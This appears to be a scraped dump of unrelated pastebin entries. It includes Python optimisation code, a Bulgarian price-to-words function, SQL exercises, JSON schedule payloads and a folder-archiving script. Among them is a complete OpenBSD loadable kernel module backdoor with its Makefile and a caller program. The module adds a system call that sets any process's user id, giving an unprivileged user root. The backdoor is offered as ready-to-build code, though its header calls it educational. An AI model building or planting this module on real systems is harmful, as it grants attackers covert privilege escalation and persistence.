    def visualize_overlapping_oriented_circular_graphs(graph1_array, graph2_array, node_color='pink',
                                                       edge_color1='lightgray', edge_color2='black'):
        graph1 = nx.from_numpy_array(graph1_array, create_using=nx.DiGraph)
        graph2 = nx.from_numpy_array(graph2_array, create_using=nx.DiGraph)
        combined_graph = nx.compose(graph1, graph2)
        pos = nx.circular_layout(combined_graph)  # Расположение с фиксированным seed
        nx.draw(graph1, pos, node_color=node_color, with_labels=False, arrows=True)  # Убираем номера вершин
        edges1 = list(graph1.edges())
        nx.draw_networkx_edges(graph2, pos, edgelist=edges1, edge_color=edge_color1, width=2)
        edges2 = list(graph2.edges())
        nx.draw_networkx_edges(combined_graph, pos, edgelist=edges2, edge_color=edge_color2, width=1)
        plt.show()

    N = 17

    d = random_matrix(N, 100)

    c = -d.flatten()

    b_eq = np.ones(N)
    b_ub = np.ones(N)

    A_eq = np.zeros((N, N ** 2))

    for i in range(N):
        a = np.zeros((N, N))
        for j in range(N):
            if d[i][j] != 0:
                a[i][j] = 1
        a = a.flatten()
        A_eq[i] = a

    A_ub = np.zeros((N, N * N))
    for i in range(N):
        for j in range(N):
            if d[i][j] != 0:
                A_ub[i][j + i * N] = 1

    b_l = np.zeros(N ** 2)
    b_u = d.flatten()
    bounds = list(zip(b_l, b_u))

    res = linprog(c, b_ub=b_ub, bounds=bounds, A_ub=A_ub, A_eq=A_eq, b_eq=b_eq)
    result = np.reshape(res.x, (N, N)) * d

    visualize_overlapping_graphs(d, result)
    print(result)

    M = 500

    D = np.random.randint(50, 100, size=(N, N))
    np.fill_diagonal(D, 0)
    print(D)

    c2 = np.concatenate((-D.flatten(), np.zeros(N * 2)))

    b_eq2 = np.ones(N)
    b_ub2 = np.array([M] * N)
    print(b_ub2)
    A_eq2 = np.zeros((N, N ** 2 + 2 * N))
    for i in range(N):
        a = np.zeros((N, N))
        zh = np.zeros(2 * N)
        for j in range(N):
            if D[i][j] != 0:
                a[i][j] = 1
                zh[N + j] = 1
        zh[i] = 1
        a = np.concatenate((a.flatten(), zh))
        A_eq2[i] = a
    np.savetxt(""A_eq.txt"", A_eq2, fmt='%d')

    A_ub2 = np.zeros((N, N * N + 2 * N))
    for i in range(N):
        for j in range(N):
            if D[i][j] != 0:
                A_ub2[i][j + i * N] = -1
            A_ub2[i][j + N ** 2 + N] = -M
    np.savetxt(""A_ub.txt"", A_ub2, fmt='%d')

    b_l2 = np.zeros(N ** 2 + 2 * N)
    b_u2 = np.concatenate((D.flatten(), np.ones(2 * N)))
    bounds2 = list(zip(b_l2, b_u2))
    print(bounds2)

    res = linprog(c=c2, b_ub=b_ub2, bounds=bounds2, A_ub=A_ub2, A_eq=A_eq2, b_eq=b_eq2)
    result = np.reshape(res.x[:N * N], (N, N)) * D

    print(result)
    visualize_overlapping_oriented_circular_graphs(D, result)

N = 17

d = random_matrix(N, 100)

c = -d.flatten()

b_eq = np.ones(N)
b_ub = np.ones(N)

A_eq = np.zeros((N, N**2))

for i in range(N):
    a = np.zeros((N, N))
    for j in range(N):
        if d[i][j] != 0:
            a[i][j] = 1
    a = a.flatten()
    A_eq[i] = a

A_ub = np.zeros((N, N*N))
for i in range(N):
    for j in range(N):
        if d[i][j] != 0:
            A_ub[i][j+i*N] = 1

b_l = np.zeros(N**2)
b_u = d.flatten()
bounds = list(zip(b_l, b_u))

res = linprog(c, b_ub=b_ub, bounds=bounds, A_ub=A_ub, A_eq=A_eq, b_eq=b_eq)
result = np.reshape(res.x, (N, N)) * d

visualize_overlapping_graphs(d, result)
print(result)


M = 500

D = np.random.randint(50, 100, size=(N, N))
np.fill_diagonal(D, 0)
print(D)

c2 = np.concatenate((-D.flatten(), np.zeros(N*2)))

b_eq2 = np.ones(N)
b_ub2 = np.array([M]*N)
print(b_ub2)
A_eq2 = np.zeros((N, N**2 + 2*N))
for i in range(N):
    a = np.zeros((N, N))
    zh = np.zeros(2*N)
    for j in range(N):
        if D[i][j] != 0:
            a[i][j] = 1
            zh[N + j] = 1
    zh[i] = 1
    a = np.concatenate((a.flatten(), zh))
    A_eq2[i] = a
np.savetxt(""A_eq.txt"", A_eq2, fmt='%d')

A_ub2 = np.zeros((N, N*N+2*N))
for i in range(N):
    for j in range(N):
        if D[i][j] != 0:
            A_ub2[i][j+i*N] = -1
        A_ub2[i][j + N**2+N] = -M
np.savetxt(""A_ub.txt"", A_ub2, fmt='%d')

b_l2 = np.zeros(N**2 + 2*N)
b_u2 = np.concatenate((D.flatten(), np.ones(2*N)))
bounds2 = list(zip(b_l2, b_u2))
print(bounds2)

res = linprog(c=c2, b_ub=b_ub2, bounds=bounds2, A_ub=A_ub2, A_eq=A_eq2, b_eq=b_eq2)
result = np.reshape(res.x[:N*N], (N, N)) * D

print(result)
visualize_overlapping_oriented_circular_graphs(D, result)"
XRWzbV9V,pastebin.ai - #1 pastebin.com alternative,xxsa,PHP,Friday 17th of May 2024 07:57:47 AM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.........................

.............................
."
PRbQ8nXs,Makefile,FlyFar,Make,Friday 17th of May 2024 07:44:37 AM CDT,"SRCS=thc_back.c
OBJS=$(SRCS:.c=.o)

MODOBJ=bck.o

KMOD=thc_bck
CFLAGS+= -Wall -D_KERNEL -I/sys

all:	$(MODOBJ)

clean:
	rm -f $(OBJS) $(KOBJS) $(MODOBJ) $(KMOD)

load:
	modload -o $(KMOD) -e$(KMOD) $(MODOBJ)

unload:
	modunload -n $(KMOD)

$(MODOBJ): $(OBJS) $(KOBJS)
	$(LD) -r -o $(MODOBJ) $(OBJS) $(KOBJS)
"
1QCK8fGH,thc_back.c,FlyFar,C,Friday 17th of May 2024 07:43:50 AM CDT,"/*
 * Name: OpenBSD backdoor
 * Date: Thu Jun 01 14:46:37 2000
 * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
 *
 * idea & credits go to pragmatic / THC 
 * 				 ""Attacking FreeBSD with Kernel Modules""
 *
 * OpenBSD porting by	pIGpEN / s0ftpj
 *
 *
 * SoftProject Digital Security for Y2K (www.s0ftpj.org)
 * Sikurezza.org Italian Security MailingList (www.sikurezza.org)
 *
 * COFFEE-WARE LICENSE - This source code is like ""THE BEER-WARE LICENSE"" by
 * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
 *
 * Tested on: OpenBSD 2.6 FRACTAL#1 i386
 * 
 * This is a simple but useful backdoor for OpenBSD based on a FreeBSD lkm
 * by pragmatic/THC you can read his paper: ""Attacking FreeBSD with Kernel
 * Modules"" to understand how to implement it also on a OpenBSD kernel...     
 *
 * Greetings to: bozo(iKX), koba (sikurezza.org), pragmatic (THC) for his
 * 		 work
 *
 * Consider this an example of lkm... don't use it!
 * I didn't cover the module because it must be considered only for 
 * educational purposes 
 */


#include <sys/param.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/conf.h>
#include <sys/syscallargs.h>
#include <sys/exec.h>
#include <sys/lkm.h>
#include <sys/file.h>
#include <sys/filedesc.h>
#include <sys/errno.h>
#include <sys/proc.h>

#define OFFSET	210

struct you_make_me_real_args {
	syscallarg(int) p_pid;	/* process to make with p_real uid */
	syscallarg(int) p_real;	/* p_real uid */
};
			   			  
static int
you_make_me_real (struct proc *p, void *v, register_t *retval) 
{	
	struct you_make_me_real_args *uap = v;
	struct proc *pr;

	if((pr = pfind(SCARG(uap, p_pid))) == NULL)
		return (ESRCH);
	
	pr->p_cred->pc_ucred->cr_uid = SCARG(uap, p_real);
	
	return 0;
}

static struct sysent you_make_me_real_sysent = {
	2,
	sizeof(struct you_make_me_real_args),
	you_make_me_real
};

MOD_SYSCALL( ""thc_bck"", OFFSET, &you_make_me_real_sysent);

int
thc_bck (struct lkm_table *lkmtp, int cmd, int ver)
{
	DISPATCH(lkmtp, cmd, ver, lkm_nofunc, lkm_nofunc, lkm_nofunc)
}
"
ipptFSeZ,call.c,FlyFar,C,Friday 17th of May 2024 07:42:44 AM CDT,"/*
 * an example to interface our syscall
 */

#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>

#define OFFSET 210

int
main(int argc, char **argv)
{
	int error;

	if(argc != 3) {
		printf(""Usage:\n%s pid uid\n"", argv[0]);
		exit(1);
	}
	
	error = syscall(OFFSET, atoi(argv[1]), atoi(argv[2]));

	if(error)
		perror(""syscall()"");

	return 0;
}
"
7cP5gQWW,convert price into words,simeonshopov,JavaScript,Friday 17th of May 2024 07:24:45 AM CDT,"                    convertPriceToWords: function (price) {
                        let final = '';
                        const singles = ['', 'един', 'две', 'три', 'четири', 'пет', 'шест', 'седем', 'осем', 'девет'];
                        const tens = ['десет', 'единадесет', 'дванадесет', 'тринадесет', 'четиринадесет', 'петнадесет',
                            'шестнадесет', 'седемнадесет', 'осемнадесет', 'деветнадесет'];
                        const twenties = ['десет', 'двадесет', 'тридесет', 'четиридесет', 'петдесет', 'шестдесет', 'седемдесет',
                            'осемдесет', 'деветдесет'];
                        const hundreds = ['сто', 'двеста', 'триста', 'четиристотин', 'петстотин', 'шестстотин', 'седемстотин',
                            'осемстотин', 'деветстотин'];

                        if (typeof price === ""number"") {
                            final = `${price.toFixed(2)} (`;
                            price = price.toString();
                            let decimalPoint = price.indexOf('.');
                            if (decimalPoint === -1) {
                                decimalPoint = price.length;
                            }
                            let numbers = price.split('');

                            for (let i = 0; i < decimalPoint; i++) {
                                if (decimalPoint === 6 && i === 0) { // стотици хиляди
                                    if (numbers[i] === '1') {
                                        final += ` ${hundreds[Number(numbers[i]) - 1]}`;
                                        i++;
                                    } else if (numbers[i] !== '0') {
                                        final += ` ${hundreds[Number(numbers[i]) - 1]}`;
                                        i++;
                                    }
                                    // десетиците от стотиците хиляди
                                    if (numbers[i] === '0') {
                                        if (numbers[i + 1] === '0') {
                                            final += ' хиляди';
                                            i += 2;
                                        } else {
                                            final += ' и';
                                            if (numbers[i + 1] === '1') {
                                                final += ' една'
                                            } else {
                                                final += ` ${singles[Number(numbers[i + 1])]}`
                                            }
                                            final += ' хиляди';
                                            i += 2;
                                        }
                                    } else {
                                        numbers[ i + 1] === '0' || numbers[i] === '1' ? final += ' и' : '';
                                        if (numbers[i] === '1') {
                                            final += ` ${tens[Number(numbers[i + 1])]}`;
                                        } else {
                                            final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                        }

                                        if (numbers[i + 1] === '1' && numbers[i] !== '1') {
                                            final += ' и една';
                                        } else if (numbers[i + 1] !== '0' && numbers[i] !== '1') {
                                            final += ` и ${singles[Number(numbers[i + 1])]}`;
                                        }

                                        final += ' хиляди';
                                        i += 2;
                                    }

                                    // стотици
                                    if (numbers[i] !== '0') {
                                        if (numbers[i + 1] === '0' && numbers[i + 2] === '0') {
                                            final += ' и';
                                            final += ` ${hundreds[Number(numbers[i]) - 1]}`;
                                            final += ' лева';
                                            i += 2;
                                        } else if (numbers[i + 1] !== '0') {
                                            final += ` ${hundreds[Number(numbers[i]) - 1]}`;
                                            i++;
                                            if (numbers[i] === '1') {
                                                final += ` и ${tens[Number(numbers[i + 1])]} лева`;
                                            } else {
                                                if (numbers[i + 1] === '0') {
                                                    final += ` и ${twenties[Number(numbers[i] - 1)]} лева`;
                                                } else {
                                                    final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                                    if (numbers[i + 1] === '2') {
                                                        final += ' и два лева';
                                                    } else {
                                                        final += ` и ${singles[Number(numbers[i + 1])]} лева`;
                                                    }
                                                }
                                            }
                                        } else {
                                            final += ` ${hundreds[Number(numbers[i]) - 1]}`;
                                            i += 2;
                                            if (numbers[i] === '2') {
                                                final += ' и двa лева';
                                            } else {
                                                final += ` и ${singles[Number(numbers[i])]} лева`;
                                            }
                                        }
                                    } else {
                                        i++;
                                        if (numbers[i] === '0') {
                                            i++;
                                            if(numbers[i] === '2') {
                                                final += ' и два лева';
                                            } else {
                                                final += ` и ${singles[Number(numbers[i])]} лева`;
                                            }
                                        } else if (numbers[i] === '1') {
                                            final += ` и ${tens[Number(numbers[i + 1])]} лева`;
                                        } else {
                                            final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                            if (numbers[i + 1] === '2') {
                                                final += ' и два лева';
                                            } else {
                                                final += ` и ${singles[Number(numbers[i + 1])]} лева`;
                                            }
                                        }
                                    }
                                } else if (decimalPoint === 5 && i === 0) { // десетки хиляди
                                    if (numbers[i] === '1') {
                                        i++;
                                        final += ` ${tens[Number(numbers[i])]}`;
                                    } else if (numbers[i] !== '0') {
                                        final += ` ${twenties[Number(numbers[i]) - 1]}`;
                                        i++;
                                        if (numbers[i] === '1') {
                                            final += ` и една`;
                                        } else if (numbers[i] === '2') {
                                            final += ' и две';
                                        } else if (numbers[i] !== '0') {
                                           
                                            final += ` и ${singles[Number(numbers[i])]}`;
                                        }
                                    }
                                    final += ' хиляди';
                                    i++;

                                    final += (numbers[i + 1] === '0' && numbers[i + 2] === '0') ? ' ' : 'и';
                                    if (numbers[i] === '1') {
                                        final += ' сто';
                                    } else if (numbers[i] === '2') {
                                        final += ' двеста';
                                    } else if (numbers[i] === '3') {
                                        final += ' триста';
                                    } else {
                                        final += ` ${singles[Number(numbers[i])]}` + `${numbers[i] !== '0' ? 'стотин' : ''}`;
                                    }
                                    i++;

                                    if (numbers[i] === '1') {
                                        final += ` и ${tens[Number(numbers[i + 1])]}`;
                                    } else if (numbers[i] !== '0') {
                                        final += numbers[i + 1] === '0' ? ' и' : '';
                                        final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                    }
                                    i++;

                                    // единици
                                    if (numbers[i - 1] !== '1') {
                                        if (numbers[i] === '1') {
                                            final += ' и един';
                                        } else if (numbers[i] === '2') {
                                            final += ' и два';
                                        } else if (numbers[i] !== '0') {
                                            final += ` и ${singles[Number(numbers[i])]}`;
                                        }
                                    }
                                    final += ' лева';

                                    // хиляди
                                } else if (decimalPoint === 4 && i === 0) {
                                    if (numbers[i] === '1') {
                                        final += ' хиляда';
                                    } else {
                                        final += ` ${singles[Number(numbers[i])]} хиляди`;
                                    }
                                    i++;

                                    final += (numbers[i + 1] === '0' && numbers[i + 2] === '0') ? '' : ' и';
                                    if (numbers[i] === '1') {
                                        final += ' сто';
                                    } else if (numbers[i] === '2') {
                                        final += ' двеста';
                                    } else if (numbers[i] === '3') {
                                        final += ' триста';
                                    } else {
                                        final += ` ${singles[Number(numbers[i])]}` + `${numbers[i] !== '0' ? 'стотин' : ''}`;

                                    }
                                    i++;

                                    if (numbers[i] === '1') {
                                        final += ` и ${tens[Number(numbers[i + 1])]}`;
                                    } else if (numbers[i] !== '0') {
                                       
                                        final += numbers[i + 1] === '0' ? ' и' : '';
                                        final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                    }
                                    i++;

                                    if (numbers[i - 1] !== '1') {
                                        if (numbers[i] === '1') {
                                            final += ' и един';
                                        } else if (numbers[i] === '2') {
                                            final += ' и два';
                                        } else if (numbers[i] !== '0') {
                                         
                                            final += ` и ${singles[Number(numbers[i])]}`;
                                        } else {

                                        }
                                    }

                                    final += ' лева';

                                    // стотици
                                } else if (decimalPoint === 3 && i === 0) {
                                    if (numbers[i] === '1') {
                                        final += ' сто';
                                    } else if (numbers[i] === '2') {
                                        final += ' двеста';
                                    } else if (numbers[i] === '3') {
                                        final += ' триста';
                                    } else {
                                        final += ` ${singles[Number(numbers[i])]}` + `${numbers[i] !== '0' ? 'стотин' : ''}`;
                                    }
                                    i++;

                                    if (numbers[i] === '1') {
                                        final += ` и ${tens[Number(numbers[i + 1])]}`;
                                    } else if (numbers[i] !== '0') {
                                        final += numbers[i + 1] === '0' ? ' и' : '';
                                        final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                    }
                                    i++;

                                    if (numbers[i - 1] !== '1') {
                                        if (numbers[i] === '1') {
                                            final += ' и един';
                                        } else if (numbers[i] === '2') {
                                            final += ' и два';
                                        } else if (numbers[i] !== '0') {
                                            final += ` и ${singles[Number(numbers[i])]}`;
                                        }
                                    }
                                    final += ' лева';

                                    // десетки
                                } else if (decimalPoint === 2 && i === 0) {
                                    if (numbers[i] === '1') {
                                        final += ` ${tens[Number(numbers[i + 1])]}`;
                                    } else if (numbers[i] !== '0') {
                                        final += ` ${twenties[Number(numbers[i] - 1)]}`;
                                    }
                                    i++;

                                    if (numbers[i - 1] !== '1') {
                                        if (numbers[i] === '1') {
                                            final += '  и един';
                                        } else if (numbers[i] === '2') {
                                            final += ' и два';
                                        } else if (numbers[i] !== '0') {
                                            final += ` и ${singles[Number(numbers[i])]}`;
                                        }
                                    }
                                    final += ' лева';
                                } else if (decimalPoint === 1 && i === 0) {
                                    if (numbers[i] === '1') {
                                        final += ' един';
                                    } else if (numbers[i] === '2') {
                                        final += ' два';
                                    } else if (numbers[i] !== '0') {
                                        final += ` ${singles[Number(numbers[i])]}`;
                                    }
                                    final += ' лева';
                                }

                            }
                            if (decimalPoint !== price.length) {
                                final += ' и';
                                let lastIndex = numbers.length - 1;
                                let preLastIndex = numbers.length - 2;

                                if (numbers[lastIndex] === '0' && numbers[preLastIndex] === '0') {
                                    final += ' нула стотинки';
                                } else if (preLastIndex === decimalPoint) {
                                    final += ` ${twenties[Number(numbers[lastIndex] - 1)]} стотинки`;
                                } else {
                                    if (numbers[preLastIndex] === '1') {
                                        final += ` ${tens[Number(numbers[lastIndex])]} стотинки`;
                                    } else if (numbers[preLastIndex] !== '0') {
                                        final += ` ${twenties[Number(numbers[preLastIndex] - 1)]}`;
                                        if (numbers[lastIndex] === '1') {
                                            final += ' и една стотинки';
                                        } else {
                                            final += numbers[lastIndex] === '0' ? ' стотинки' : ` и ${singles[Number(numbers[lastIndex])]} стотинки`;
                                        }
                                    } else {
                                        if (numbers[lastIndex] === '1') {
                                            final += ' една стотинка';
                                        } else {
                                            final += ` ${singles[Number(numbers[lastIndex])]} стотинки`;
                                        }
                                    }
                                }
                            }

                            final += ' )';
                        }
                        return final.replace('.', ',');
                    }"
xvxk4Qzj,sql,savano20,MySQL,Friday 17th of May 2024 07:20:21 AM CDT,"-- 1. Urutkan data berdasarkan tanggal terbaru
SELECT * FROM kiriman ORDER BY tanggal ASC

-- 2. Kelompokkan data berdasarkan nama: [nama, jumlah kiriman, total nilai_paket, total ongkos_kirim]
SELECT name, count(jenis) as jumlah kiriman, SUM(nilai_paket) as total nilai_paket, SUM(ongkos_kirim) as total ongkos_kirim FROM kiriman GROUP BY nama, jenis, nilai_paket, ongkos_kirim

-- 3. kelompokkan data berdasarkan tanggal pengiriman: [tanggal, jumlah kiriman, total nilai_paket, total ongkos_kirim]
SELECT tanggal, count(jenis) as jumlah kiriman, SUM(nilai_paket) as total nilai_paket, SUM(ongkos_kirim) as total ongkos_kirim FROM kiriman GROUP BY tanggal, jenis, nilai_paket, ongkos_kirim

-- 4. Kelompokkan data berdasarkan jenis pengirimannya: [jenis, total kiriman, ongkos_kirim]
SELECT jenis, count(jenis) as total kiriman, SUM(ongkos_kirim) as total ongkos_kirim FROM kiriman GROUP BY jenis, ongkos_kirim

-- 5. Kelompokkan data berdasarkan nama dan jenis pengirimannya: [nama, total kiriman cod, total kiriman regular, total ongkos_kirim cod, total ongkos_kirim reguler]
SELECT
    nama,
    IF jenis == 'COD'
    THEN SUM(JENIS) AS total COD,
    IF jenis == 'REGULER'
    THEN SUM(JENIS) AS total REGULER,
    IF jenis == 'COD'
    THEN SUM(ongkos_kirim) AS total ongkos COD,
    IF jenis == 'REGULER'
    THEN SUM(ongkos_kirim) AS total ongkos REGULER,
FROM kiriman GROUP BY nama, jenis, ongkos_kirim

-- 6. Edit kiriman joko tanggal 2021-10-19 dengan ongkos_kirim menjadi 20000
UPDATE SET kiriman ('ongkos_kirim') VALUES (20000) WHERE nama = 'joko' AND tanggal = '2021-10-19'

-- 7. Hapus kiriman udin yang ongkos kirimnya 12000
DELETE FROM kiriman WHERE nama = 'udin' AND ongkos_kirim = '12000'"
nM6qax0v,Untitled,yash123321,JSON,Friday 17th of May 2024 07:19:19 AM CDT,"{
  ""payloadList"": [
    {
      ""dealerUuid"": ""b7aedae19a153bfcc453f36e373d9937bf4ff0df4bb76c1006297fc61b92bd35"",
      ""source"": ""TRANSPORT_OPTION_DATEWISE_SCHEDULE"",
      ""transportOptionUuid"": ""w5fkIJojY4v-pCn0VBtnCur1AsjPwkH2RHUpf89LiMU"",
      ""platform"": ""DEALER_APP"",
      ""addedLimits"": [
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""date"": ""2024-05-18""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 0
              }
            }
          ],
          ""date"": ""2024-05-19""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""date"": ""2024-05-17""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""date"": ""2024-05-21""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 2
              }
            }
          ],
          ""date"": ""2024-05-22""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 2
              }
            }
          ],
          ""date"": ""2024-05-20""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""13:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""date"": ""2024-05-23""
        }
      ],
      ""deletedLimits"": null
    }
  ],
  ""empty"": false
}"
evDUmRUU,Untitled,yash123321,JSON,Friday 17th of May 2024 07:16:45 AM CDT,"{
  ""payloadList"": [
    {
      ""dealerUuid"": ""b7aedae19a153bfcc453f36e373d9937bf4ff0df4bb76c1006297fc61b92bd35"",
      ""source"": ""TRANSPORT_OPTION_WEEKLY_SCHEDULE"",
      ""transportOptionUuid"": ""w5fkIJojY4v-pCn0VBtnCur1AsjPwkH2RHUpf89LiMU"",
      ""platform"": ""DEALER_APP"",
      ""addedLimits"": [
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""04:00:00"",
              ""endTime"": ""06:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 2
              }
            }
          ],
          ""day"": ""Thu""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""04:00:00"",
              ""endTime"": ""06:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Tue""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""04:00:00"",
              ""endTime"": ""06:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Sat""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""04:00:00"",
              ""endTime"": ""06:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Fri""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""04:00:00"",
              ""endTime"": ""06:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Mon""
        }
      ],
      ""deletedLimits"": [
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Thu""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Tue""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Wed""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Sat""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Fri""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 0
              }
            }
          ],
          ""day"": ""Sun""
        },
        {
          ""slotLimitList"": [
            {
              ""startTime"": ""11:00:00"",
              ""endTime"": ""12:00:00"",
              ""limit"": {
                ""limitPer"": ""TRANSPORT_LIMIT_PER"",
                ""limit"": 1
              }
            }
          ],
          ""day"": ""Mon""
        }
      ]
    }
  ],
  ""empty"": false
}"
dS9VZbg5,move folders into other folders on a particular day and time,nicuf,Python,Friday 17th of May 2024 07:13:35 AM CDT,"import os
import shutil
from datetime import datetime

def move_folders(source_dir, dest_dir):
    # Parcurgem toate fișierele și directoarele din directorul sursă
    for item in os.listdir(source_dir):
        item_path = os.path.join(source_dir, item)
        
        # Verificăm dacă este un director
        if os.path.isdir(item_path):
            
            # Verificăm dacă numele directorului conține virgulă
            if ',' in item:
                # Dacă da, înseamnă că este un director format din 2 sau 3 cuvinte
                first_letter = item.split(',')[0][0].upper()
                
                # Calea către directorul destinație
                dest_folder = os.path.join(dest_dir, first_letter)
                
                # Verificăm dacă directorul destinație există, altfel îl creăm
                if not os.path.exists(dest_folder):
                    os.makedirs(dest_folder)
                
                # Mutăm directorul în directorul destinație
                shutil.move(item_path, os.path.join(dest_folder, item))
                print(f""Directorul {item} a fost mutat în {dest_folder}"")

def copy_folders(source_dir, dest_dir):
    # Parcurgem toate fișierele și directoarele din directorul sursă
    for item in os.listdir(source_dir):
        item_path = os.path.join(source_dir, item)
        dest_path = os.path.join(dest_dir, item)
        
        # Verificăm dacă este un director
        if os.path.isdir(item_path):
            # Copiem directorul în directorul destinație
            shutil.copytree(item_path, dest_path)
            print(f""Directorul {item} a fost copiat în {dest_dir}"")

# Căile către directoarele implicate
arhiva_dir = r""g:\ARHIVA""
upload_curent_dir = r""e:\UPLOAD\_SAPT. CURENTA""
upload_trecut_dir = r""e:\UPLOAD\_SAPT. TRECUTA""

# Verificăm ziua săptămânii
if datetime.today().weekday() == 0:  # Luni
    # Mutăm folderele din ""_SAPT. TRECUTA"" în ""ARHIVA""
    move_folders(upload_trecut_dir, arhiva_dir)
    
    # Copiem folderele din ""_SAPT. CURENTA"" în ""_SAPT. TRECUTA""
    copy_folders(upload_curent_dir, upload_trecut_dir)

    print(""Operațiunile au fost efectuate cu succes!"")
else:
    print(""Astăzi nu este luni, operațiunile nu au fost efectuate."")"
NDrAvP4K,Untitled,yash123321,JSON,Friday 17th of May 2024 06:59:57 AM CDT,"{
  ""dealerUuid"": ""b7aedae19a153bfcc453f36e373d9937bf4ff0df4bb76c1006297fc61b92bd35"",
  ""source"": ""DEALER_WEEKLY_SCHEDULE"",
  ""daySlotAvailabilityList"": [
    {
      ""day"": 6,
      ""slotAvailabilityList"": [
        {
          ""startTime"": ""00:15:00"",
          ""endTime"": ""00:45:00"",
          ""isUnavailable"": false
        },
        {
          ""startTime"": ""01:15:00"",
          ""endTime"": ""01:30:00"",
          ""isUnavailable"": true
        }
      ]
    }
  ],
  ""dayLimits"": {
    ""dayToLimitsMap"": {
      ""6"": [
        {
          ""limitPer"": ""DAY"",
          ""limit"": 106
        },
        {
          ""limitPer"": ""SLOT"",
          ""limit"": null
        }
      ]
    }
  }
}"
i42qpUfL,Untitled,yash123321,JSON,Friday 17th of May 2024 06:57:52 AM CDT,"{
  ""dealerUuid"": ""b7aedae19a153bfcc453f36e373d9937bf4ff0df4bb76c1006297fc61b92bd35"",
  ""source"": ""DEALER_DATEWISE_SCHEDULE"",
  ""dateLimits"": {
    ""dateToLimitsMap"": {
      ""2024-05-18 00:00:00"": [
        {
          ""limitPer"": ""DAY"",
          ""limit"": 106
        },
        {
